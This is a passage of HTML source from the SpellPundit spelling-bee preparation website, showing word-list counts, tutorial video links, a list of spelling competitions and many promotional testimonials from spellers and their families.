                                    <p>SpellPundit can generate custom word lists on request. Some examples of custom word lists are words from a particular spelling bee’s list or words from a certain category (ex. Geographical names, world currencies, animal/plant genus names).</p> 
                                </div>
                            </div>
                        </div>
                        
                    </div>
                </div>
                <div  class="col-lg-4 col-md-4 col-xs-12 float-left">
                    <div class="table-responsive">
                      <table class="table table-bordered table-striped">
                        <thead class="bg-success inline-seven">
                        <tr><th>Word Lists</th>
                          <th>Word Count</th>
                            </tr></thead>
                        <tbody>
                          <tr>
                            <td>Spelling Word List 1</td>
                            <td>7,465</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 2</td>
                            <td>8,400</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 3</td>
                            <td>9,400</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 4</td>
                            <td>8,800</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 5</td>
                            <td>15,150</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 6</td>
                            <td>14,200</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 7</td>
                            <td>11,700</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 8</td>
                            <td>11,100</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 9</td>
                            <td>15,200</td>
                          </tr>
                          <tr>
                            <td>Spelling Word List 10</td>
                            <td>14,400</td>
                          </tr>
                          <tr>
                            <td>Vocabulary Word List 1 </td>
                            <td>7,400</td>
                          </tr>
                          <tr>
                            <td>Vocabulary Word List 2</td>
                            <td>8,400</td>
                          </tr>
                          <tr>
                            <td>Vocabulary Word List 3</td>
                            <td>9,150 </td>
                          </tr>
                          <tr>
                            <td>Vocabulary Word List 4</td>
                            <td>8,800 </td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                </div>
            </div>
        </div>
      </div>
    </section>
    <!-- Awesome Screens Section End -->  
    
    <!-- Testimonial Section Start -->
     <section id="demo" class="section pricing container">
      <div>
        <div class="section-header">
          <h2 class="section-title"><span>Spellpundit Videos</span></h2>
          <!--<h4>Watch this short video to learn how to use SpellPundit effectively!</h4>
          <p>Spellpundit E-learning word lists to learn words faster!<br />Spellpundit Tutorial Ver2 Sep 2018</p>-->
        </div>
        <div class="row justify-content-center">
          <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12 inline-nine">
            <div id="testimonials123">
              <div class="item  col-sm-2" style="float:left;max-width:18.5%;margin-right:0.5%">
                <div class="testimonial-item" style="padding:30px 0px;">
                  <div class="video-promo-content text-center" style="background:url(img/video_1.jpg?<?php echo rand(); ?>) no-repeat;">
                    <!--<a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><img src="img/video.jpg" alt="spellpundit" style="width:100%;" /></a>-->
                    <a href="https://www.youtube-nocookie.com/embed/rJH7CcTDYB0?start=11&autoplay=1" class="video-popup">
                    	<img src="img/video_icon.png" alt="spellpundit"
                         border="0" style="width:60px; margin-top:60px;" />
                    </a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div><div class="item  col-sm-2" style="float:left;max-width:18.5%;margin-right:0.5%">
                <div class="testimonial-item" style="padding:30px 0px;">
                  <div class="video-promo-content text-center" style="background:url(img/2024-SpellPundit-Senior-Spelling-Bee-Finals.jpg?<?php echo rand(); ?>) no-repeat center;background-size:contain;background-color:#ffce34;">
                    <!--<a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><img src="img/video.jpg" alt="spellpundit" style="width:100%;" /></a>-->
                    <a href="https://www.youtube-nocookie.com/embed/1Ttr89bXao0?start=11&autoplay=1" class="video-popup">
                    	<img src="img/video_icon.png" alt="spellpundit"
                         border="0" style="width:60px; margin-top:60px;" />
                    </a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>
              
              <div class="item  col-sm-2" style="float:left;max-width:18.5%;">
                <div class="testimonial-item" style="padding:30px 0px;">
                  <div class="video-promo-content text-center" style="background:url(img/2024-SpellPundit-Junior-Spelling-Bee-Finals.jpg?<?php echo rand(); ?>) no-repeat center;background-size:contain;background-color:#ffce34;">
                    <!--<a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><img src="img/video.jpg" alt="spellpundit" style="width:100%;" /></a>-->

                    <a href="https://www.youtube-nocookie.com/embed/vHZT8GSz44I?start=11&autoplay=1" class="video-popup">
                    	<img src="img/video_icon.png" alt="spellpundit"
                         border="0" style="width:60px; margin-top:60px;" />
                    </a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>
              <div class="item  col-sm-2" style="float:left;max-width:18.5%;margin-right:0.5%">
                <div class="testimonial-item" style="padding:30px 0px;">
                  <div class="video-promo-content text-center" style="background:url(img/preparation_tips.png?<?php echo rand(); ?>) no-repeat;background-size:contain;background-position:center;background-color:#ffce34;">
                    <!--<a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><img src="img/video.jpg" alt="spellpundit" style="width:100%;" /></a>-->
                    <a href="https://www.youtube-nocookie.com/embed/_kH60J-x0aw?start=11&autoplay=1" class="video-popup">
                    	<img src="img/video_icon.png" alt="spellpundit"
                         border="0" style="width:60px; margin-top:60px;" />
                    </a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>
              
              <div class="item  col-sm-2" style="float:left;max-width:18.5%;margin-right:0.5%">
                <div class="testimonial-item" style="padding:30px 0px;">
                  <div class="video-promo-content text-center" style="background:url(img/webnair.png) no-repeat;">
                    <!--<a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><img src="img/video.jpg" alt="spellpundit" style="width:100%;" /></a>-->
                    <a href="https://www.youtube-nocookie.com/embed/DlxFLvkvudU?start=11&autoplay=1" class="video-popup">
                    	<img src="img/video_icon.png" alt="spellpundit"
                         border="0" style="width:60px; margin-top:60px;" />
                    </a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>
              
              <!--<div class="item col-sm-4" style="display:inline-block;">
                <div class="testimonial-item">
                  <div class="video-promo-content text-center">
                    <a href="https://www.youtube.com/watch?v=emGFmnQh5DU?start=11&autoplay=1" class="video-popup"><i class="fa fa-play" aria-hidden="true"></i></a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>
              <div class="item col-sm-4 float-left">
                <div class="testimonial-item">
                  <div class="video-promo-content text-center">
                    <a href="https://www.youtube-nocookie.com/embed/1AKm2usafUA?start=11&autoplay=1" class="video-popup"><i class="fa fa-play" aria-hidden="true"></i></a>
                    <h2 class="mt-3 wow zoomIn" data-wow-duration="1000ms" data-wow-delay="100ms"></h2>
                  </div>
                </div>
              </div>-->                            
            </div>
          </div>
        </div>
      </div>
    </section>
    <!-- Testimonial Section End -->  

    <!-- Team section Start -->
    <section id="competitions" class="section competition container">
      <div>
        <div class="section-header">
          <h1 class="section-title"><span>Competitions</span></h1>
          <h3 class="sub-titles">SpellPundit resources are designed to prepare students for these competitions.</h3>
        </div>
        </div>
        <div class="container-fluid" style="height:auto;">
        	<div class="container">
        	    <div class="row single-team" style="text-align: center;justify-content: center;height: auto;padding: 20px 20px;width: auto;"><img src="img/logo.png" alt="spellpundit" title="spellpundit.com"></div>
        	    <div class="row" style="text-align: center;padding: 10px 0px;font-size: 18px;color: #2576bc;justify-content: center;">
        	        <a href="spellpundit-national-spelling-bee.php">SpellPundit National Spelling Bee</a><br/><br/>
        	    </div>
                <div class="row">
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.2s">
                      <div class="team-thumb">
                        <img src="img/comp-img1.png" alt="spellpundit" title="Scripps National Spelling Bee" class="img-responsive inline-eight" width="196px" height="196px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://spellingbee.com/" target="_blank">Scripps National Spelling Bee</a></h4>
                    </div>
                  </div>
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.3s">
                      <div class="team-thumb">
                        <img src="img/comp-img2.png" alt="spellpundit" title="North South Foundation" class="img-responsive inline-eight" width="224px" height="225px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://www.northsouth.org/public" target="_blank">North South Foundation</a></h4>
                    </div>
                  </div>
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.4s">
                      <div class="team-thumb">
                        <img src="img/comp-img3.png" alt="spellpundit" title="South Asian Spelling Bee" class="img-responsive inline-eight" width="190px" height="183px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://southasianspellingbee.com/" target="_blank">South Asian Spelling Bee</a></h4>
                    </div>
                  </div>
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.5s">
                      <div class="team-thumb">
                        <img src="img/comp-img4.png" alt="spellpundit" title="North American Spelling Champion Challenge" class="img-responsive inline-eight" width="149px" height="168px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://naspellingbee.com/" target="_blank">North American Spelling Champion Challenge</a></h4>
                    </div>
                  </div>
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.5s">
                      <div class="team-thumb">
                        <img src="img/comp-img5.png" alt="spellpundit" title="Spandana Spelling Bee" class="img-responsive inline-eight" width="210px" height="207px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://www.spandana.org/SpandanaEvents/Spelling-Bee/" target="_blank">Spandana Spelling Bee</a></h4>
                    </div>
                  </div>
                  <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.5s">
                      <div class="team-thumb">
                        <img src="img/comp-img6.png" alt="spellpundit" title="WishWin" class="img-responsive inline-eight" width="139px" height="128px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://www.wishwin.org" target="_blank">WishWin</a></h4>
                    </div>
                  </div>
                 <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.5s">
                      <div class="team-thumb">
                        <img src="img/wiz_international.jpg" alt="spellpundit" title="WIZ Spelling Bee" class="img-responsive inline-eight" width="149px" height="168px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://wizspellbee.com/" target="_blank">WIZ Spelling Bee</a></h4>
                    </div>
                  </div>
                 <div class="col-lg-3 col-md-3 col-xs-12">
                    <div class="single-team wow fadeInUp" data-wow-delay="0.5s">
                      <div class="team-thumb">
                        <img src="img/comp-img41.png" alt="spellpundit" title="TGSBC Spelling Bee" class="img-responsive inline-eight" width="149px" height="168px">
                      </div>              
                    </div>
                    <div class="overlay">
                        <h4><a href="https://www.facebook.com/TheGlobalSpellingBeeChampionship/" target="_blank">TGSBC Spelling Bee</a></h4>
                    </div>
                  </div>
                </div>
            </div>
        </div>
    </section>
    <!-- Team section End -->

    

    <!-- download Section Start -->
	<section id="testimonials" class="container">
        <div class="row">
        	<div class="testimonials">
                <div class="section-header">
                  <h2 class="section-title"><span>Testimonials</span></h2>
                </div>
                <div class="carousel-controls testimonial-carousel-controls">
                  <div class="control d-flex align-items-center justify-content-center prev mt-3"><i class="fa fa-chevron-left"></i></div>
                  <div class="control d-flex align-items-center justify-content-center next mt-3"><i class="fa fa-chevron-right"></i></div>
        
                  <div class="testimonial-carousel">
                      
                      
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Dev_Shah.jpg" class="img-thumbnail" alt="spellpundit" title="Dev Shah" width="120px" height="120px">
                        </div> 
                        <div class="message text-center blockquote w-100"><br/>"I am forever grateful to the Spellpundit team for providing guidance and comprehensive word lists. I correlate my success in the Scripps National Spelling Bee to Spellpundit. I also recommend participating in the Spellpundit bees as they are well organized. I am thankful to the Dasari family and Spellpundit. I wholeheartedly recommend Spellpundit to anyone vying for the Scripps Cup!"</div>
                        <div class="blockquote-footer w-100 text-white">Dev Shah, 2023 Scripps National Spelling Bee Champion</div>

                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Rachamreddy.jpg" class="img-thumbnail" alt="spellpundit" title="Rachamreddy" style="width:120px;height:120px;"/>
                        </div> 
                        <div class="message text-center blockquote w-100"><br/>"SpellPundit is a very valuable resource in my spelling bee preparation. SpellPundit organizes its words into modules and sets, and it also allows you to group together missed words and starred words. Its lists make preparation for spelling bees much less time consuming and more efficient. The more recent modules such as the geographical module are also useful for current spelling bees. I would like to thank the SpellPundit team for creating SpellPundit as it has been the best computer program I have used for spelling and vocabulary."</div>
                        
                        <div class="blockquote-footer w-100 text-white">Shradha Rachamreddy, 2023 SpellPundit National Online Spelling Bee Champion</div>

                      </div>
                    </div>
                  
                  	<div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Zailla.jpg" class="img-thumbnail" alt="spellpundit" title="Aryan" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                             "Zailla said she studied 13,000 words a day using SpellPundit"
                        </div>
                        <div class="blockquote-footer w-100 text-white">Washington Post July 9 2021</div>
                        <div class="message text-center blockquote w-100"><br/>"I became good at spelling by mostly studying using a program called SpellPundit," she said. The studying has definitely paid off!</div>
                        <div class="blockquote-footer w-100 text-white">Zaila Avant-garde<br/>New Orleans News July 9 2021</div>

                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Deetya.jpg" class="img-thumbnail" alt="spellpundit" title="Yash Shelar" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">"In February 2021, I started serious spelling again and I was only mastered with level 1 of spellpundit then. Within a year I went through almost every module of spellpundit for spelling and vocabulary. That's more than 100k words for spelling. Mastering so many words with oral quizzing is very difficult and will take many man hours. It was easy to do with spellpundit with its features of additional information, starred words and archived words. Recently many competitions ask geographical, phrased and scientific type words and Spellpundit has them covered and gives you an idea to search for more words from the dictionary. Also custom lists made it easy for me to upload the words that I got from dictionary diving. My spelling journey was made easy by using spellpundit and it gave me the confidence to go to any competition.<br/><br/>I could not participate in my regional bees in 6th and 7th grade with my twin brother in the same school. SpellPundit competitions gave me the necessary confidence and practice for the other bees.They are well conducted with professional pronouncers and judges. Overall, spellpundit played a pivotal role in my spelling journey."</div>
                        <div class="blockquote-footer w-100 text-white">Deetya Vuppala, 2022 World Spelling Bee Championship champion and 2022 SpellPundit National Online Spelling Bee Co-champion</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Yash.jpg" class="img-thumbnail" alt="spellpundit" title="Yash Shelar" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">"SpellPundit is an invaluable resource for people of all levels to succeed in the Scripps National Spelling Bee and other national bees. Their word lists contain the pronunciation, part of speech, language of origin, and definition for each and every word which saved me many hours during my preparation. The software is extremely efficient and helped me go from complete beginner to winning the SpellPundit National Bee and placing high in other bees such as South Asian Spelling Bee, WishWin, and North South Foundation all in less than a year and a half. Thank you to the Dasari family and other past Scripps competitors for making this amazing program which helped me and will help many aspiring spellers in years to come."</div>
                        <div class="blockquote-footer w-100 text-white">Yash Shelar, 2022 SpellPundit National Online Spelling Bee Co-champion</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Saharsh.jpg" class="img-thumbnail" alt="spellpundit" title="Saharsh Vuppala" width="120px" style="height:120px !important;">
                        </div>
                        <div class="message text-center blockquote w-100">"SpellPundit has been an indispensable part of my spelling journey. The word lists in spellpundit helped me not only with spelling but also with vocabulary.<br/><br/>
I started serious spelling in the middle of fourth grade and at that point it seemed a daunting task to master so many words. I discovered SpellPundit that summer and the way it is organized helped me prioritize, plan and prepare for different spelling competitions.The features I like are archived words, learning mode, star words, custom lists (that I can upload after dictionary diving) and related words. The root word lists and additional information sections help in improving the foundations of spelling like spelling rules and roots.<br/><br/>
My twin sister , Deetya also does spelling and it's not always possible for my mom to quiz all the words. SpellPundit has been very handy in this case and helped in organizing my work and makes my preparation more efficient. I am also happy with how fast the website is and rarely find any issues with it."</div>
                        <div class="blockquote-footer w-100 text-white">Saharsh Vuppala, 4th place at 2022 Scripps National Spelling Bee, 2021 SpellPundit National Online Spelling Bee Champion</div>
                      </div>
                    </div>
                    
                     <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Kirsten_Santos.jpg" class="img-thumbnail" alt="spellpundit" title="Kirsten Santos" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">"SpellPundit has helped me throughout my spelling bee journey. Its archives and favorites lists help me target the areas that I have most trouble with and correct them. Its division of words into word lists and sets organize words in a systematic and structured way. Its custom spelling and vocabulary lists allow me to compile all the words I often make a mistake on so I can decrease my practice time while maximizing it to the fullest ability. Overall, SpellPundit is efficient, effective, and easy to use and I highly recommend it for future spellers. I am so thankful to the SpellPundit team and the Dasari family."</div>
                        <div class="blockquote-footer w-100 text-white">Kirsten Santos, 5th place at 2022 Scripps National Spelling Bee</div>
                      </div>
                    </div>
                    
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Abhilash.jpg" class="img-thumbnail" alt="spellpundit" title="Abhilash Patel" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "I express all my gratitude for the SpellPundit Team and their website. SpellPundit was tremendously helpful during my spelling bee journey. It paved a way for me to study efficiently when others weren't available. I enjoyed their archived and mistakes feature, as it let me review words that gave me trouble. Without the incredible support of SpellPundit, I would not have achieved great heights in the Scripps National Spelling Bee, North South Foundation, or the South Asian Spelling Bee. I show all my appreciation to the Dasari family and their wonderful team of pronouncers and editors for the SpellPundit website."</div>
                        <div class="blockquote-footer w-100 text-white">Abhilash Patel, 5th place at 2022 Scripps National Spelling BeeBee</div>
                      </div>
                    </div>
                    
                    
                   
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Nitya.jpg" class="img-thumbnail" alt="spellpundit" title="Nitya" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "Spellpundit is extremely useful for a speller to use on their journey and helps a lot with Roots, Homonyms, Spelling, and Vocabulary. It is split into sections of words based on difficulty or where they come from, and this provides an easy method of learning by tackling each module separately. I feel that SpellPundit has guided my path in spelling and it will continue to do so for future spellers to come."</div>
                        <div class="blockquote-footer w-100 text-white">Nitya Kathiravan, 9th place at 2022 Scripps National Spelling Bee</div>
                      </div>
                    </div>                    
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Shijay.jpg" class="img-thumbnail" alt="spellpundit" title="Shijay" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "Spellpundit is an extremely helpful resource for spellers aspiring to do well in the Scripps National Spelling Bee and many other spelling bees. There are a wide range of word lists such as vocabulary, roots, and homonyms word lists that help with every aspect of preparation. In addition to the variety of word lists in Spellpundit, the word lists are arranged at a specific level of difficulty making it convenient for spellers to know which word lists to start with. My favorite aspects of Spellpundit are the ability to mark words that might give you trouble and the archived feature that allows you to view your missed words at any time after using the testing mode. Whenever I could not be quizzed by my parents or sister, I could easily use Spellpundit to practice on my own with efficiency. Spellpundit is a great resource that played a key part in my spelling journey and will continue to help many spellers in the future!"</div>
                        <div class="blockquote-footer w-100 text-white">Shijay Sivakumar, 9th place at 2022 Scripps National Spelling Bee</div>
                      </div>
                    </div>
                    
                    
                     <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Sahana.jpg" class="img-thumbnail" alt="spellpundit" title="Sahana Srikanth" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "SpellPundit is a great platform to use to test your knowledge of spelling, vocabulary, as well as roots, especially for the national level of competition. It offers a wide variety of difficulty and distribution which helps spellers gain understanding for a broad spectrum of languages.<br /><br /> 

SpellPundit National bees have significantly helped me while I was focusing on preparation for Nationals in 2021 and 2022, because they allow you to practice spelling unfamiliar words and speaking under time pressure. The words chosen are selected for the speller's benefit to maximize the amount we learn, and I am grateful to SpellPundit for allowing many spellers including myself to familiarize themselves with bee format through their program."</div>
                        <div class="blockquote-footer w-100 text-white">Sahana Srikanth, 9th Place at 2022 Scripps National Spelling Bee</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Shrethan_Botla.jpg" class="img-thumbnail" alt="spellpundit" title="Shrethan Botla" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "SpellPundit is an amazing website that offers comprehensive word lists and easy-to-use software to prepare for any spelling or vocabulary competition. With SpellPundit, I was able to master thousands of words from different categories. I also learned a lot of useful information about words, such as their origins, definitions, and other key information that is important to use in a spelling bee. SpellPundit helped me improve my spelling skills and vocabulary knowledge in an efficient and effective way. Thanks to SpellPundit, I was able to build and expand on a base of spelling that's been very useful in my spelling career which helped me learn from simple to complex words with the use of concise modes which include learning and testing. Overall, SpellPundit has been a huge help to me who's been doing spelling bees for a long time now and is a site I definitely recommend to those that want to engage in spelling bees."</div>
                        <div class="blockquote-footer w-100 text-white">Shrethan Botla, 10th Place at 2023 SpellPundit National Senior Spelling Bee</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Ananya.jpg" class="img-thumbnail" alt="spellpundit" title="Ananya" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">"Ananya started her Spelling journey with SpellPundit and has been using SpellPundit since her third grade. SpellPundit provides a strong foundation and a structured approach for aspiring young spellers to start spelling the words at their comfort level and work their way up.<br /><br />SpellPundit word lists are very well designed and constantly updated to accommodate the varying format of spelling bees. SpellPundit helps the spellers to set a goal and work towards the goal, to track the progress, to revisit the missed and challenging words. It is very efficient, easy to use, and has been developed keeping the spellers in mind.<br /><br />Kudos to the entire SpellPundit team for building this program and for always being so professional and prompt in their replies. Thank you SpellPundit for guiding the spellers in their spelling journey!"</div>
                        <div class="blockquote-footer w-100 text-white">Family of Ananya Rao Prasanna- 2021 SpellPundit National Online Junior Spelling Bee Champion</div>
                      </div>
                    </div>
                    
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/testi-img.png" class="img-thumbnail" alt="spellpundit" title="Sohum Sukhatankar" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "We are very happy with and grateful to the entire SpellPundit team. Their software played a crucial role in Sohum's daily training regimen. The various word lists allowed him to identify his areas of weakness and practice these words to attain mastery. 
In addition to Sohum's daily practice on SpellPundit, the SpellPundit team generously answered our queries and told us which areas he needed improvement in. They made a guided plan for him before regional and national spelling bees on which levels he needed to practice again and in which order. They also gave us helpful advice before each Bee. The night before the Scripps finals, Mrs. Dasari and Shobha Dasari gave Sohum some important tips to succeed in the final rounds.
Sohum was also coached by Shourav Dasari who gave him challenging words that were designed with Sohum's past mistakes at the Nationals in mind. This came in very handy in preparing for the Nationals. 
Thank you so much to the SpellPundit team for playing a vital part in Sohum's journey in becoming a 2019 Scripps National Spelling Bee co-champ."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Sohum Sukhatankar, 2019 Scripps National Spelling Bee co-champion
</div>
                      </div>
                    </div>
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Shruthika.png" class="img-thumbnail" alt="spellpundit" title="Shruthika" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                        "SpellPundit has been incredibly helpful in my preparation for Scripps. It provided me with an effective way to practice words and test myself on words of varying difficulty. The entire SpellPundit team is very prompt and helpful in answering questions. SpellPundit is a wonderful resource for spellers of all levels!"</div>
                        <div class="blockquote-footer w-100 text-white">Shruthika Padhy, 2019 Scripps National Spelling Bee co-champion</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Christopher.jpg" class="img-thumbnail" alt="spellpundit" title="Christopher" width="120px" height="120px">
                        </div>
                        <div class="message text-center blockquote w-100">
                       "Chris used SpellPundit frequently. The various word lists helped quiz him in preparation for the bee. The word lists are well-designed. The program was a good resource when there was no one available to quiz him. The SpellPundit preliminary tests gave him the confidence to perform well on the national bee written test."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Christopher Serrao, 2019 Scripps National Spelling Bee co-champion</div>
                      </div>
                    </div>
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Aritra_Banerjee.jpg" class="img-thumbnail" alt="spellpundit" title="Aritra_Banerjee" width="120px" height="120px">
                        </div>
                         <div class="message text-center blockquote w-100">
                        "SpellPundit has been a very crucial resource in Aritra’s spelling bee endeavor. The website organizes words into diverse levels which allows him to learn and review many words very quickly and with ease. Aritra finds the Archives the most valuable because they help him review every word he has ever gotten wrong on any specific set of words. In addition, the Weekly Preliminaries Test benefited Aritra because it allowed him to gauge his current level.  Overall, Spell Pundit is a great spelling website that anyone can benefit from."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Aritra Banerjee, 17th place at 2019 Scripps National Spelling Bee
</div>
                      </div>
                    </div>
                    
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Cal.jpg" class="img-thumbnail" alt="spellpundit" title="Cal" width="120px" height="120px">
                        </div>
                         <div class="message text-center blockquote w-100">
                        "SpellPundit played a huge role in my spelling journey this year. The endless word lists with easy-to-use ways to learn and test them greatly helped me increase my knowledge for the bee. I believe that SpellPundit is the best spelling resource on the market as the word database is very large and it is fast and easy to use. The software's ability to store my missed words allowed for me to target areas of improvement. I also valued the "favorite" ability as I could keep a separate section of words that I thought were challenging or interesting."</div>
                        <div class="blockquote-footer w-100 text-white">Calvin Alexander, 30th Place at 2019 Scripps National Spelling Bee
</div>
                      </div>
                    </div>
					<div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
                        	<img src="img/Maya.jpg" class="img-thumbnail" alt="spellpundit" title="Maya" width="120px" height="120px">
                        </div>
                         <div class="message text-center blockquote w-100">
                        "SpellPundit has been a great resource in Maya's spelling journey! As a ten year old fifth grader, Maya won the 2019 Wisconsin State Spelling Bee and made the group of final 50 spellers at the 2019 Scripps National Spelling Bee, ultimately tying for the 41st place. Maya credits her success to SpellPundit which provides her with a great compilation of spelling word lists, vocabulary word lists, a roots module, and others. Thank you to the whole SpellPundit team for their support and creating this valuable tool! Maya plans to keep using SpellPundit to improve her spelling skills. SpellPundit is indeed a one stop resource for everyone, from beginning spellers to advanced ones."</div>
                        <div class="blockquote-footer w-100 text-white">Family of Maya Jadhav, 41st Place at 2019 Scripps National Spelling Bee
</div>
                      </div>
                    </div>
                    <div class="h5 font-weight-normal one-slide mx-auto">
                      <div class="testimonial w-100 px-3 text-center  d-flex flex-direction-column justify-content-center flex-wrap align-items-center">
                      	<div class="test-img">
